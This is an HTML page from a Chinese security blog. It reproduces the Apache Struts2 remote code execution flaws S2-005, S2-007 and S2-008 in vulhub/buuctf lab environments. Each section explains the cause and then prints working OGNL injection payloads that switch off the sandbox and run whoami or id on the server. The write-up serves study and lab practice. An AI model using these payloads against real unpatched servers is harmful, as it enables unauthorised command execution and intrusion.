@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="S2-005影响 影响版本: 2.0.0 - 2.1.8.1  漏洞详情: http:&#x2F;&#x2F;struts.apache.org&#x2F;docs&#x2F;s2-005.html 原理参考吴翰清的《白帽子讲Web安全》一书。  s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2系列 远程代码执行漏洞 复现">
+<meta property="og:url" content="http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="S2-005影响 影响版本: 2.0.0 - 2.1.8.1  漏洞详情: http:&#x2F;&#x2F;struts.apache.org&#x2F;docs&#x2F;s2-005.html 原理参考吴翰清的《白帽子讲Web安全》一书。  s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-20-43-43.png">
+<meta property="og:image" content="http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-21-18-28.png">
+<meta property="og:image" content="http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-22-26-22.png">
+<meta property="article:published_time" content="2022-03-07T13:08:05.000Z">
+<meta property="article:modified_time" content="2022-03-08T14:30:06.501Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="vulhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-20-43-43.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>struts2系列 远程代码执行漏洞 复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/03/06/CVE-2007-4556-Struts2-001-%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&text=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&title=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&is_video=false&description=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=struts2系列 远程代码执行漏洞 复现&body=Check out this article: http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&title=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&title=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&title=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&title=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&name=struts2系列 远程代码执行漏洞 复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/&t=struts2系列 远程代码执行漏洞 复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-005"><span class="toc-number">1.</span> <span class="toc-text">S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D"><span class="toc-number">1.1.</span> <span class="toc-text">影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-007"><span class="toc-number">2.</span> <span class="toc-text">S2-007</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-1"><span class="toc-number">2.1.</span> <span class="toc-text">影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-008"><span class="toc-number">3.</span> <span class="toc-text">S2-008</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-2"><span class="toc-number">3.1.</span> <span class="toc-text">影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">3.3.</span> <span class="toc-text">利用</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        struts2系列 远程代码执行漏洞 复现
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/" class="leancloud-visitors" data-flag-title="struts2系列 远程代码执行漏洞 复现">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-07T13:08:05.000Z" itemprop="datePublished">2022-03-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/vulhub/" rel="tag">vulhub</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><blockquote>
+<p>影响版本: 2.0.0 - 2.1.8.1</p>
+</blockquote>
+<p>漏洞详情: <a target="_blank" rel="noopener" href="http://struts.apache.org/docs/s2-005.html">http://struts.apache.org/docs/s2-005.html</a></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>参考吴翰清的《白帽子讲Web安全》一书。</p>
+<blockquote>
+<p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p>
+</blockquote>
+<p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
+<ul>
+<li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li>
+<li>S2-003 后官方增加了安全模式（沙盒）</li>
+<li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li>
+</ul>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>GET 方法执行命令，无法直接回显，回显在会自动下载的action文件头</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%<span class="number">28</span>%<span class="number">27</span>%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%<span class="number">27</span>]%5Cu003dfalse%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%<span class="number">27</span>%<span class="number">29</span>%28kxlzx%<span class="number">29</span>%28kxlzx%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mycmd%5Cu003d%5C%27whoami%5C%<span class="number">27</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%<span class="number">28</span>%<span class="number">29.</span><span class="built_in">exec</span>%<span class="number">28</span>%5Cu0023mycmd%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%28A%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%<span class="number">28</span>%5Cu0023myret.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28B%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myres%5Cu003dnew%5C40byte[<span class="number">51020</span>]%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28C%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mydat.readFully%<span class="number">28</span>%5Cu0023myres%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28D%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%<span class="number">28</span>%5Cu0023myres%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%<span class="number">28</span>%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%28E%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myout.getWriter%<span class="number">28</span>%<span class="number">29.</span>println%<span class="number">28</span>%5Cu0023mystr%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>POST 直接回显</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;%23req%3d%23context.get(%27co%<span class="number">27</span>%2b%27m.<span class="built_in">open</span>%<span class="number">27</span>%2b%27symphony.xwo%<span class="number">27</span>%2b%27rk2.disp%<span class="number">27</span>%2b%27atcher.HttpSer%<span class="number">27</span>%2b%27vletReq%<span class="number">27</span>%2b%27uest%<span class="number">27</span>),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27<span class="built_in">id</span>%<span class="number">27.</span>toString().split(%<span class="number">27</span>\\s%<span class="number">27</span>))).start().getInputStream()).useDelimiter(%<span class="number">27</span>\\AAAA%<span class="number">27</span>),%23<span class="built_in">str</span>%3d%23s.hasNext()?%23s.<span class="built_in">next</span>():%<span class="number">27</span>%<span class="number">27</span>,%23resp%3d%23context.get(%27co%<span class="number">27</span>%2b%27m.<span class="built_in">open</span>%<span class="number">27</span>%2b%27symphony.xwo%<span class="number">27</span>%2b%27rk2.disp%<span class="number">27</span>%2b%27atcher.HttpSer%<span class="number">27</span>%2b%27vletRes%<span class="number">27</span>%2b%27ponse%<span class="number">27</span>),%23resp.setCharacterEncoding(%27UTF-<span class="number">8</span>%<span class="number">27</span>),%23resp.getWriter().println(%23<span class="built_in">str</span>),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p>POST 例子，以buuctf为例<br><img src="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-20-43-43.png"></p>
+<p><strong>参考：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/blankunbeaten/p/14826753.html">S2-005 远程代码执行漏洞</a><br><a target="_blank" rel="noopener" href="https://taomujian.github.io/2021/05/14/S2_005/">S2-005漏洞分析</a><br><a target="_blank" rel="noopener" href="http://www.b1ue.cn/archives/107.html">Struts2 历史漏洞分析 — S2-005</a></p>
+<h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><h3 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h3><blockquote>
+<p>版本: 2.0.0 - 2.2.3<br>漏洞详情: <a target="_blank" rel="noopener" href="http://struts.apache.org/docs/s2-007.html">http://struts.apache.org/docs/s2-007.html</a></p>
+</blockquote>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：</ActionName></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
+<p>然后配置有 UserAction-validation.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">validators</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>EXP </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span><span class="built_in">id</span><span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br></pre></td></tr></table></figure>
+<p>以buuctf为例<br><img src="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-21-18-28.png"></p>
+<p><strong>参考：</strong>   </p>
+<p><a target="_blank" rel="noopener" href="https://taomujian.github.io/2021/05/14/S2_007/">S2-007漏洞分析  </a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md">S2-007 远程代码执行漏洞</a></p>
+<h2 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h2><h3 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h3><blockquote>
+<p>影响版本: 2.1.0 - 2.3.1</p>
+</blockquote>
+<p>漏洞详情: <a target="_blank" rel="noopener" href="http://struts.apache.org/docs/s2-008.html">http://struts.apache.org/docs/s2-008.html</a></p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
+<p>例如在 devMode 模式下直接添加参数?debug&#x3D;command&amp;expression&#x3D;<OGNL exp>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）</OGNL></p>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=%<span class="number">28</span>%23_memberAccess%5<span class="string">B&quot;allowStaticMethodAccess&quot;</span>%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%<span class="number">28</span><span class="string">&quot;false&quot;</span>%<span class="number">29</span>%<span class="number">20</span>%2C%23context%5<span class="string">B&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%<span class="number">28</span>@java.lang.Runtime@getRuntime%<span class="number">28</span>%<span class="number">29.</span><span class="built_in">exec</span>%<span class="number">28</span>%27whoami%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>以buuctf为例<br><img src="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-22-26-22.png"></p>
+<p><strong>参考：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://taomujian.github.io/2021/05/14/S2_008/">S2-008漏洞分析</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md">S2-008 远程代码执行漏洞</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
